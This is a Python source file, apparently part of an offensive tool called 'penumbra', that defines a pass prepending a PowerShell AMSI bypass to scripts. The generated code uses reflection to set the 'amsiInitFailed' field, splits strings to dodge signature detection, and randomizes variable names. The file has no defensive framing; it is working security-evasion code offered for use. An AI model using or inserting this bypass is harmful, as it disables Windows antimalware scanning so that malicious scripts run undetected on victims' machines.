"""PS1 AMSI bypass prepend pass — adds reflection-based AMSI bypass."""

from __future__ import annotations

import secrets

from penumbra.types import PassConfig


def _gen_bypass() -> str:
    """Generate an AMSI bypass block with randomized variable names."""
    v1 = "_" + secrets.token_hex(3)
    v2 = "_" + secrets.token_hex(3)
    return (
        f"${v1} = [Ref].Assembly.GetType("
        f"('System.Manage'+'ment.Auto'+'mation.'+'Am'+'si'+'Ut'+'ils'))\n"
        f"${v2} = ${v1}.GetField("
        f"('am'+'si'+'Init'+'Fai'+'led'), 'NonPublic,Static')\n"
        f"${v2}.SetValue($null, $true)\n"
    )


class AmsiBypassPass:
    """Prepend a reflection-based AMSI bypass to the script."""

    @property
    def name(self) -> str:
        return "amsi"

    def apply(self, data: bytes, config: PassConfig) -> bytes:  # noqa: ARG002
        bypass = _gen_bypass()
        return (bypass + data.decode("utf-8")).encode("utf-8")
